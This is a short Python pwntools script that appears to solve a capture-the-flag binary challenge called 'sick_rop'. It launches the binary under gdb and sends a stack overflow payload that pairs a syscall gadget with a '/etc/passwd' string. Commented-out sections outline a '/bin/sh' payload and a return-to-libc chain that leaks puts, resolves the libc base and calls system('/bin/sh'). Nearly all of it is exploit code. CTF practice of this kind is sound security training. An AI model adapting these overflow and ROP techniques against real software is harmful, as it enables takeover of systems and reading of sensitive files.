from pwn import *

context.terminal = ['tmux', 'splitw', '-h', '-d']
context.arch = 'amd64'

elf = ELF('sick_rop', checksec=0)

syscall = 0x0040100f

if True:
    proc = gdb.debug(elf.path, '\n'.join([
        # 'b *0x00401040', # read
        # 'b *0x00401048', # write
        f'b *{hex(syscall)}',
        'c',
        'c',
    ]))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=0)
else: 
    pass

# rop1 = ROP([elf])
# rop1.call(elf.symbols['_start'])

# payload = b'/bin/sh\0'
# payload = payload.ljust(40, b'\x69')
# payload += p64(syscall)
# proc.send(payload.ljust(322, b'\x00'))

payload = b'/etc/passwd\0'
payload = payload.ljust(40, b'\x69')
payload += p64(syscall)
payload += p64(0x0040100f) # somewhere in read
payload += b'\x70' * 16
payload += p64(0x300)
proc.send(payload.ljust(257, b'\x00'))

# rop1.call(elf.symbols['fill'])

# proc.sendline('1')
# padding = b'a' * 32 + b'b' * 8
# proc.send(padding + rop1.chain())
# proc.recvuntil(padding)

# marker = b'\n\x1b[1;6;32m\nYou can add these'
# result = proc.recvuntil(marker)
# print(f'Read the following: {[result]}')

# offset_addr_raw = result[-6 - len(marker): -len(marker)].ljust(8, b'\x00')
# offset_addr = u64(offset_addr_raw)
# print(f'Found offset address {offset_addr_raw}  -->  {hex(offset_addr)}')

# libc.address = offset_addr - libc.symbols['puts']
# print(f'Found libc at {hex(libc.address)}')


# rop2 = ROP([libc])
# rop2.call(libc.symbols['puts'], [next(libc.search(b'/bin/sh'))])
# rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
# proc.send(padding + rop2.chain())

proc.interactive()
